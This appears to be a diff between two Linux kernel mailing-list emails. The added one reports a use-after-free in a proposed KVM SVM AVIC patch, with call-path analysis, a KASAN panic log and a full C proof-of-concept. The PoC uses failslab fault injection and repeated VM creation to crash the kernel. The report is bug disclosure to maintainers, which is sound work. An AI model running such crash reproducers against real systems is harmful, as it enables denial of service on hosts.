@@ -1,90 +1,354 @@
-Received: from mail-pj1-f43.google.com (mail-pj1-f43.google.com [209.85.216.43])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from out162-62-57-137.mail.qq.com (out162-62-57-137.mail.qq.com [162.62.57.137])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CE9E32D97A6
-	for <sashiko-reviews@lists.linux.dev>; Sun, 28 Jun 2026 18:22:49 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.43
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0CB5315746F
+	for <sashiko-reviews@lists.linux.dev>; Sun, 28 Jun 2026 18:31:52 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.137
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782670971; cv=none; b=DcHBnoVarhKNFifua6u7HzJn+4qgo3OXSg4WLioZ2n3ENP6+ppZjsP1oa+iI/WP8sZrh2MzQrPqNSiRNor+TlaGPXTdFnqv0YrCEn0BVAiHOCMJrcX37TZCz3hjlSXCD0te5RUx7/OdHead82rrU9/c8S+d7DnnE97237rYpvyA=
+	t=1782671515; cv=none; b=P6ce3/MTGPZAlC+aOMk2ZmC/dJqVuAiAGgtDUfYAzc6NyYwofMwN8eJFHqdByJf3jttDGtHVcDbo1Lj6krhdT7O+6ZeAdV4tBa6gI/eBiBTOcn1HQmH1AQSsWsSs8GhRxed8/qOhVyhgrfsI4FnXkjL5k5A0bAzIkVV+gOsmnMA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782670971; c=relaxed/simple;
-	bh=Z0DQ9dWZ2koMQA8ywoE0uWtSaYihQ0LX5J4USq5K1Kc=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=AXa61KMx/g+82kqncwP3UJfqW1stigkJiJ5noZvQ+hHOAkxCWUcs1Ru30hXa0wA/nYUJpq8owdLKgzZYlBhCgJRkvpyr5AfqRFX6FSyxWHra3rEI/G9bKDRqhNijuTlQVxXSpgf3lN2nucYJtum5UTD8DFSyIvdp56R0kigGFdA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=JygIFmjo; arc=none smtp.client-ip=209.85.216.43
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1782671515; c=relaxed/simple;
+	bh=7olRA1OWwRnt+hMn4Ias0nfrTgopSu0wZiod1q7BaRQ=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=H7yNen/PclofP3IMu3JFUX1VDjfy1sBYAUugJ2ZFZzAYUGEDgeBCTks0Ca5z9MGCykjrfXxFjaUlB+3soWus0uej3Ydv8CO966E+GizaZ+PqkfGPS/WFMdzUZCeXetITTd8O0QLc/ZO48KGKF/P63yFHzFEOZAHNKEYGanOnuKw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=Nzdzi2lt; arc=none smtp.client-ip=162.62.57.137
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="JygIFmjo"
-Received: by mail-pj1-f43.google.com with SMTP id 98e67ed59e1d1-37d70036426so1033218a91.3
-        for <sashiko-reviews@lists.linux.dev>; Sun, 28 Jun 2026 11:22:49 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1782670969; x=1783275769; darn=lists.linux.dev;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=Z0DQ9dWZ2koMQA8ywoE0uWtSaYihQ0LX5J4USq5K1Kc=;
-        b=JygIFmjovCFvbmuKUejeCytkGwXTlX/oDC3q45OjMYBA4bQvY9fhCp/2vJlPm09FAz
-         JU7qrjmp2Vu0JHzF1daYiFBxorTNarOdKNLuofVwkSJkhdatgdDu9TSYWKpHUV6HbY7l
-         is8T6Ii6yzSE6b7Nh1OLaG65KSrcTijbuCxDNA8B7HHUUNGF5c5XSxEvc8Yt2q4qOTl1
-         Q7hjMhY+BsGPB996Q2vE8Y8w4oVclrB6RFVBudQHu7HMGUOw6QZV6yfSTvDMw6QjFQj5
-         lbY8eqPsspbbQw4gMn8acwzPhI0avF72rQejy5fBxwnhR4mPvk6vl9mlYV/I7PijB5Pi
-         Wz8Q==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1782670969; x=1783275769;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=Z0DQ9dWZ2koMQA8ywoE0uWtSaYihQ0LX5J4USq5K1Kc=;
-        b=ZBitWF71anSr5dodW6+E+2CUTTgDvgsP5IZD0mJtZi9hbt8pwp0wbfC+dJHdpIptuG
-         UWy/50RskiL0U4SXRkdEJIcgIzzQlUZPWtDXoOqV7uNAjlj+9Qlh2TkSeYBuCdLFUBOF
-         ytYLcSLP0/Udnl43Ay5intn9GUDbrkr2OKVEJQ1rcU54SUVxj90PtOyNrgR9VAGxLmJH
-         giHWccU0lTGYfv/tm2KC9Glq0QEBJ8MvhK6UMQuYqU9j9rs7iIEoRBn4iEEu84MwLGQY
-         hChRoPCmELrMpDWKbbfyfe10OKiAIjeJtGuJ6+mPGxIEGHvGy2fRFjNr7JLK5PPZVys9
-         BHiw==
-X-Gm-Message-State: AOJu0YxHwifzgd6p2QAefbF544rCl/W5JNmo39eKm25F37U5VTCz/ClJ
-	pkt7cUPMc65pxjNOGbCYCRTVq5/eGe4A6NIceGM/4ivqFtxJyrGHaQVleuoF8A==
-X-Gm-Gg: AfdE7ckJWw1e8AVosjwbKF+J2F+fWx4xxPrFn/3hqNaWDG9mOFj5eKKfJU2DoWz0iXo
-	8VvufjZx32YckpItA76da7QXyy4rFHbQgM/d6XuL9HTTh5k8047GcbJXdtC84V+794qeHdYIO5V
-	RhMsbIJWqdo93p3BVryD+qZ7GnmjpRqknKtinqVSug3DKnwt06Irw9KAdUPd9YQDADHkfTtzhK6
-	L2ycQ2q2UGN6vK4gG32oaUsRG+Ya5IwKih2+clHVHWsGYDw0iGVA982P2hzrxs6LAJ5EhTPaarN
-	sAIuS8KTcoisd1+g5fMvdENJKxIdaW27+o/sOxN2ZZ/1I6rWXPwlgIYiiX38OqRC5XaOlp4Ojtg
-	MzpUZd7VTiIN+xm+pNJKWay3tX2VWZ2JZ+igikH3S9nV+5x89rOZsg6dJ387XMU0zTbYrK7FEjv
-	fR/pFuqKkszGTuIqdTRlPXZ3P7QBogeyG6XsMRVAVtF86Uwet+yzdp2LbEjrMmpQhX7wkV/ioTf
-	h/1bfLYNGDnKvT/EUaYSD7bRqEwFGK+NgVFqw==
-X-Received: by 2002:a17:90a:da84:b0:37f:a915:1c29 with SMTP id 98e67ed59e1d1-37fa9151d83mr6068848a91.19.1782670969047;
-        Sun, 28 Jun 2026 11:22:49 -0700 (PDT)
-Received: from libra11 ([143.248.188.236])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-37ffdc238c8sm781779a91.6.2026.06.28.11.22.46
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 28 Jun 2026 11:22:48 -0700 (PDT)
-From: SeungJong Ha <engineer.jjhama@gmail.com>
-To: sashiko-reviews@lists.linux.dev
-Cc: ojeda@kernel.org,
-	dri-devel@lists.freedesktop.org,
-	acourbot@nvidia.com,
-	dakr@kernel.org,
-	rust-for-linux@vger.kernel.org,
-	nova-gpu@lists.linux.dev,
-	SeungJong Ha <engineer.jjhama@gmail.com>
-Subject: Re: [PATCH RFC 4/4] gpu: nova-core: gsp: convert GspMem to zerocopy via the transmute bridge
-Date: Sun, 28 Jun 2026 18:21:54 +0000
-Message-ID: <20260628182154.712621-1-engineer.jjhama@gmail.com>
-X-Mailer: git-send-email 2.54.0
-In-Reply-To: <20260628172200.B116D1F000E9@smtp.kernel.org>
-References: <20260628-dma-zerocopy-bridge-v1-0-9a2895ebe30d@gmail.com> <20260628-dma-zerocopy-bridge-v1-4-9a2895ebe30d@gmail.com> <20260628172200.B116D1F000E9@smtp.kernel.org>
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="Nzdzi2lt"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1782671502; bh=hau3ggqY9HcRqj/hoZ+vfOqFf/4UpY7B/8XP8+OPS1Y=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=Nzdzi2lt5z+ezBoR1VRO6Y35pMyLzQg9BeB9fMnuxsbfSr25bu3Bo5duePySm/rH6
+	 IPx+TQp8LhZA/gZ6iohHf/ogFqYarht5h2i/RLfPQe972kgiOhbZWgpIipfZTp09Nf
+	 mKrM+W3J5yUByxsts0dLGT/C1Srcd39BM1Dn9B6Q=
+Received: from [192.168.1.102] ([223.77.180.178])
+	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
+	id 79883E56; Mon, 29 Jun 2026 02:30:24 +0800
+X-QQ-mid: xmsmtpt1782671424trd52ai99
+Message-ID: <tencent_FD175C44E33B0A7C1923AF4772333226E206@qq.com>
+X-QQ-XMAILINFO: N91PKLMQLILLiwnE3Nm3UnOcH4aHLgfS8aI4SCNKGVCpJLdAdAnnVVSwW8OEji
+	 x1KAGMaxB/j24wtoaVi4frWIfoAdsotfq36GXzR2AmIOrTdTXyZrMaNVy8kCByiS8IOkoWs4cawz
+	 fGC8YlHUXk1voy5oZXSUf+cw2+7HTKaMonewEIHFAgji9NcZMW3orsKv5EyoKzWv4pGsRHl05+iJ
+	 PEBvq2HtI15+5/eM5Ue8udQDJAf22SFKuwkKvaMVqmXhb5fbn52rGHuAZ4i7slFrrFSJ1E3vyokz
+	 tJBetZpJFlfYl1sEPKzW+ZT0Tab8YTchNvQereNID4FUQrEnq+hvHTXlG15T8JHLgkqOGXMYO9xJ
+	 ce8QfBqdtFwFp9kc6AhiD0obepzjgAMHfn7Soun7DfUnRmYZmCmWUYToisXT7U9bXwvDr3M8zavU
+	 6yWXsXjJ4qcETBvGrwjvaLeHFy0nM/GTL19jhew+T0oOZ+GZsiLV8708SyRkv16CZGU1NNn5ofnK
+	 2jZCmOkMZ497ZkH/K7FWsl8cZjCvQv+Pq3TXmdWpxhF2X0C3eiSOF72y/FlHCpazWDk2U7DuvfgQ
+	 vRolf0CUA9GW9Me0IpsrAw3nEhNaWtwRy4E+JSc3g8WqeU+Y0nl3XG69xcZH7eAF9RUvCd03LTWT
+	 rdfb/QpaEoySxYtsltu6YKGshRZg/U9nJkL8R/XfhaQNncvVWIZsYxCiEISS7RkJDFMM6KTn6ZdK
+	 6/x8rSef/3L8keCDJg+wrlqj4SgZITtDz9i9mOtqCFGodtv6vcbtW+suwDsc/14grY2n3bsmaHS1
+	 XO07mQe13hKIahXdGjqG3Afuzf2TmKhiKI07rxx8Kfo1mAF5kGji/15HM8jyK4K1mWw4sbNxVMFo
+	 S5G4k1chNScwOtOn/5s8w7hexup+BvyLt3Zo7xH/3+1K9bAZIW7ydDAI2aYOj2iRZ32bB+E1sbXW
+	 AVYe+IjO2rWvm/+Lem90306l57WkIX4B2yRl4S9p444n08Dj3Y7lv9CgUQsCPpduDXTjHQFGkFF5
+	 BpEI7q0g==
+X-QQ-XMRINFO: NI4Ajvh11aEjEMj13RCX7UuhPEoou2bs1g==
+X-OQ-MSGID: <2e2a4276-9a13-4a50-8c19-cf246b49e06f@qq.com>
+Date: Mon, 29 Jun 2026 02:30:24 +0800
 Precedence: bulk
 X-Mailing-List: sashiko-reviews@lists.linux.dev
 List-Id: <sashiko-reviews.lists.linux.dev>
 List-Subscribe: <mailto:sashiko-reviews+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:sashiko-reviews+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH 1/2] KVM: SVM: Remove VM from the GA Log notifier list
+ before VM destruction
+To: sashiko-reviews@lists.linux.dev, Sean Christopherson <seanjc@google.com>
+Cc: kvm@vger.kernel.org
+References: <20260625220933.3357733-1-seanjc@google.com>
+ <20260625220933.3357733-2-seanjc@google.com>
+ <20260625222635.A2D461F000E9@smtp.kernel.org>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260625222635.A2D461F000E9@smtp.kernel.org>
+Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
 
-This is pre-existing and not changed by this patch: it only makes
-explicit (via a checked `zerocopy` derive) what the previous `unsafe
-impl transmute::{FromBytes, AsBytes}` already allowed implicitly -- the
-layout is byte-identical and the message-handling path is untouched -- so
-it neither introduces nor addresses this. I'm not familiar enough with
-the GSP threat model to judge whether the TOCTOU is in scope here; if it
-is worth noting, I can add a TODO comment near the affected reads.
+Hi Sean,
+
+Thanks for this patch series! The Sashiko AI review system flagged a
+potential issue with this patch, and I was able to reproduce it -- a
+KASAN slab-use-after-free triggers when the VM creation error path is
+exercised via fault injection.
+
+ > diff --git a/arch/x86/kvm/svm/avic.c b/arch/x86/kvm/svm/avic.c
+ > index 58e493a80cb0..6b100fb014a6 100644
+ > --- a/arch/x86/kvm/svm/avic.c
+ > +++ b/arch/x86/kvm/svm/avic.c
+ > @@ -311,9 +311,18 @@ int avic_alloc_physical_id_table(struct kvm *kvm)
+ >      return 0;
+ >  }
+ >
+ > +void avic_vm_pre_destroy(struct kvm *kvm)
+ > +{
+ > +    if (WARN_ON_ONCE(!enable_apicv))
+ > +        return;
+ > +
+ > +    guard(spinlock_irqsave)(&svm_vm_data_hash_lock);
+ > +
+ > +    hash_del(&to_kvm_svm(kvm)->hnode);
+ > +}
+
+This moves hash_del() out of avic_vm_destroy() and into the new
+avic_vm_pre_destroy().  The normal VM teardown path calls both:
+
+   kvm_destroy_vm()
+     -> kvm_arch_pre_destroy_vm()   // calls avic_vm_pre_destroy -> hash_del
+     -> kvm_destroy_vcpus()
+     -> kvm_arch_destroy_vm()       // calls avic_vm_destroy (no hash_del)
+
+However, the error path in kvm_create_vm() does NOT call
+kvm_arch_pre_destroy_vm():
+
+   kvm_create_vm()
+     -> kvm_arch_init_vm()          // succeeds -> avic_vm_init -> hash_add
+     -> kvm_init_mmu_notifier()     // FAILS (e.g., -ENOMEM)
+     -> goto out_err_no_mmu_notifier
+       -> kvm_arch_destroy_vm()     // avic_vm_destroy -- no longer does 
+hash_del
+       -> kvm_arch_free_vm()        // frees kvm_svm with hnode still in 
+hash
+
+After this, the global svm_vm_data_hash contains a dangling hnode
+pointing into freed memory.
+
+--- Reproduction ---
+
+Kernel: 7.1.0-ga868c399eeaa #2 SMP PREEMPT_DYNAMIC
+Config: CONFIG_KASAN=y, CONFIG_FAILSLAB=y, CONFIG_KVM_AMD=y,
+         CONFIG_FAULT_INJECTION=y, CONFIG_FAULT_INJECTION_DEBUG_FS=y
+QEMU:  QEMU Standard PC (Q35 + ICH9, 2009)
+Boot:  kvm_amd.avic=1 kvm_amd.force_avic=1 (NPT + AVIC force-enabled)
+
+The PoC uses failslab fault injection to make kvm_init_mmu_notifier()
+fail with -ENOMEM after kvm_arch_init_vm() has already succeeded (and
+avic_vm_init() has added the VM to the hash table).  Each attempt runs
+in a forked child so the mmu_notifier_subscriptions allocation is
+always a first-time allocation.
+
+--- KASAN Crash Log ---
+
+[  697.157863][ T9682] BUG: KASAN: slab-use-after-free in 
+avic_vm_init+0x352/0x3a0
+[  697.159562][ T9682] Write of size 8 at addr ff1100010b75ba20 by task 
+poc/9682
+[  697.161750][ T9682] CPU: 0 UID: 0 PID: 9682 Comm: poc Tainted: G   
+  U  W           7.1.0-ga868c399eeaa #2 PREEMPT(full)
+[  697.161888][ T9682] Call Trace:
+[  697.161905][ T9682]  <TASK>
+[  697.161926][ T9682]  dump_stack_lvl+0x116/0x1f0
+[  697.162022][ T9682]  print_report+0xf4/0x600
+[  697.162275][ T9682]  kasan_report+0xe0/0x110
+[  697.162438][ T9682]  ? avic_vm_init+0x352/0x3a0
+[  697.162524][ T9682]  avic_vm_init+0x352/0x3a0
+[  697.162602][ T9682]  svm_vm_init+0xc5/0x1c0
+[  697.162659][ T9682]  kvm_arch_init_vm+0x19d/0x820
+[  697.162819][ T9682]  kvm_dev_ioctl+0xb10/0x1a50
+[  697.163422][ T9682]  __x64_sys_ioctl+0x193/0x210
+[  697.163479][ T9682]  do_syscall_64+0x129/0x880
+[  697.163537][ T9682]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  697.163932][ T9682]  </TASK>
+[  697.193129][ T9682] Allocated by task 17750:
+[  697.194864][ T9682]  __kvmalloc_node_noprof+0x397/0x920
+[  697.195370][ T9682]  kvm_dev_ioctl+0x15d/0x1a50
+[  697.196681][ T9682]  __x64_sys_ioctl+0x193/0x210
+[  697.196681][ T9682]  do_syscall_64+0x129/0x880
+[  697.197226][ T9682]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  697.197445][ T9682] Freed by task 17750:
+[  697.199629][ T9682]  kfree+0x171/0x720
+[  697.199997][ T9682]  kvm_dev_ioctl+0x5b4/0x1a50
+[  697.200881][ T9682]  __x64_sys_ioctl+0x193/0x210
+[  697.201310][ T9682]  do_syscall_64+0x129/0x880
+[  697.201847][ T9682]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  697.202066][ T9682] The buggy address belongs to the cache 
+kmalloc-cg-8k of size 8192
+[  697.203320][ T9682] The buggy address is located 6688 bytes inside of
+[  697.203320][ T9682]  freed 8192-byte region [ff1100010b75a000, 
+ff1100010b75c000)
+
+[  704.158056][ T9682] BUG: unable to handle page fault for address: 
+ffa000000278fa20
+[  704.159842][ T9682] #PF: supervisor write access in kernel mode
+[  704.164220][ T9682] Oops: Oops: 0002 [#1] SMP KASAN NOPTI
+[  704.167928][ T9682] RIP: 0010:avic_vm_init+0x29a/0x3a0
+[  704.216489][ T9682] Kernel panic - not syncing: Fatal exception
+
+Note the call chain matches the review prediction exactly:
+   avic_vm_init -> svm_vm_init -> kvm_arch_init_vm -> kvm_dev_ioctl
+
+The allocation and free are both from kvm_dev_ioctl (KVM_CREATE_VM):
+the first VM is freed on the error path, and the second VM creation
+tries to traverse svm_vm_data_hash in avic_vm_init(), dereferencing
+the freed kvm_svm.
+
+--- PoC ---
+
+Build:  gcc -o poc poc.c -static
+Run:    ./poc
+
+The kernel also needs the following boot parameters for AVIC:
+   kvm_amd.avic=1 kvm_amd.force_avic=1
+
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+  * PoC for KVM SVM AVIC dangling pointer bug introduced by commit:
+  * "KVM: SVM: Remove VM from the GA Log notifier list before VM 
+destruction"
+  *
+  * BUG DESCRIPTION:
+  * The patch moves hash_del() from avic_vm_destroy() to the new
+  * avic_vm_pre_destroy().  On the VM creation error path in 
+kvm_create_vm():
+  *   1. kvm_arch_init_vm() succeeds -> calls avic_vm_init() -> adds to hash
+  *   2. kvm_init_mmu_notifier() fails (ENOMEM from failslab on
+  *      kzalloc(sizeof(mmu_notifier_subscriptions), GFP_KERNEL_ACCOUNT))
+  *   3. kvm_arch_destroy_vm() is called, which calls avic_vm_destroy()
+  *      but NOT avic_vm_pre_destroy()
+  *   4. kvm_arch_free_vm() frees the kvm_svm with hnode still in hash
+  *
+  * KEY INSIGHT: The mmu_notifier_subscriptions allocation happens only ONCE
+  * per process mm_struct. To try it many times, we must fork a child 
+process
+  * for each attempt, so each child has a fresh mm without 
+notifier_subscriptions.
+  */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <linux/kvm.h>
+#include <errno.h>
+
+#define KVM_PATH "/dev/kvm"
+#define FAILSLAB_PROBABILITY "/sys/kernel/debug/failslab/probability"
+#define FAILSLAB_TIMES "/sys/kernel/debug/failslab/times"
+#define FAILSLAB_INTERVAL "/sys/kernel/debug/failslab/interval"
+#define FAILSLAB_IGNORE_GFP_WAIT 
+"/sys/kernel/debug/failslab/ignore-gfp-wait"
+#define FAILSLAB_TASK_FILTER "/sys/kernel/debug/failslab/task-filter"
+
+static int write_int(const char *path, int val)
+{
+     int fd = open(path, O_WRONLY);
+     if (fd < 0) return -1;
+     char buf[64];
+     int len = snprintf(buf, sizeof(buf), "%d", val);
+     write(fd, buf, len);
+     close(fd);
+     return 0;
+}
+
+static int write_str(const char *path, const char *val)
+{
+     int fd = open(path, O_WRONLY);
+     if (fd < 0) return -1;
+     write(fd, val, strlen(val));
+     close(fd);
+     return 0;
+}
+
+/* Child process: try to create a KVM VM.
+  * Returns via exit code: 0=success, 1=ENOMEM failure */
+static void try_create_vm(int kvm_fd)
+{
+     int vm_fd;
+
+     vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
+     if (vm_fd >= 0) {
+         close(vm_fd);
+         _exit(0);
+     }
+
+     if (errno == ENOMEM)
+         _exit(1);
+     _exit(2);
+}
+
+int main(void)
+{
+     int kvm_fd;
+     int iter, status;
+     int success = 0, enomem_fails = 0, other_fails = 0;
+     pid_t pid;
+
+     setbuf(stdout, NULL);
+     setbuf(stderr, NULL);
+
+     fprintf(stderr, "[.] Opening /dev/kvm...\n");
+     kvm_fd = open(KVM_PATH, O_RDWR);
+     if (kvm_fd < 0) {
+         perror("open /dev/kvm");
+         return 1;
+     }
+     fprintf(stderr, "[+] /dev/kvm opened\n");
+
+     fprintf(stderr, "[.] Configuring failslab fault injection...\n");
+     if (write_int(FAILSLAB_PROBABILITY, 3) < 0) {
+         fprintf(stderr, "[-] Cannot configure failslab\n");
+         close(kvm_fd);
+         return 1;
+     }
+     write_int(FAILSLAB_TIMES, 100000000);
+     write_int(FAILSLAB_INTERVAL, 1);
+     write_str(FAILSLAB_IGNORE_GFP_WAIT, "N");
+     write_str(FAILSLAB_TASK_FILTER, "N");
+     fprintf(stderr, "[+] Fault injection configured (prob=3%%)\n");
+
+     fprintf(stderr, "[.] Creating VMs in child processes...\n");
+
+     for (iter = 0; iter < 50000; iter++) {
+         pid = fork();
+         if (pid == 0) {
+             try_create_vm(kvm_fd);
+         }
+
+         waitpid(pid, &status, 0);
+
+         if (WIFEXITED(status)) {
+             int exit_code = WEXITSTATUS(status);
+             if (exit_code == 0) {
+                 success++;
+             } else if (exit_code == 1) {
+                 enomem_fails++;
+                 fprintf(stderr, "[!] ENOMEM at iter=%d (success=%d, 
+enomem=%d)\n",
+                     iter, success, enomem_fails);
+
+                 /* After a dangling hash entry was created,
+                  * further VMs will trigger use-after-free. */
+                 int j;
+                 for (j = 0; j < 100; j++) {
+                     pid_t pid2 = fork();
+                     if (pid2 == 0) {
+                         try_create_vm(kvm_fd);
+                     }
+                     waitpid(pid2, NULL, 0);
+                 }
+             } else {
+                 other_fails++;
+             }
+         }
+
+         if (iter % 5000 == 0) {
+             fprintf(stderr, "[.] iter=%d success=%d enomem=%d other=%d\n",
+                 iter, success, enomem_fails, other_fails);
+         }
+     }
+
+     fprintf(stderr, "[+] FINAL: success=%d enomem=%d other=%d\n",
+         success, enomem_fails, other_fails);
+
+     close(kvm_fd);
+     return 0;
+}
+
+Thanks,
+Xiao
+
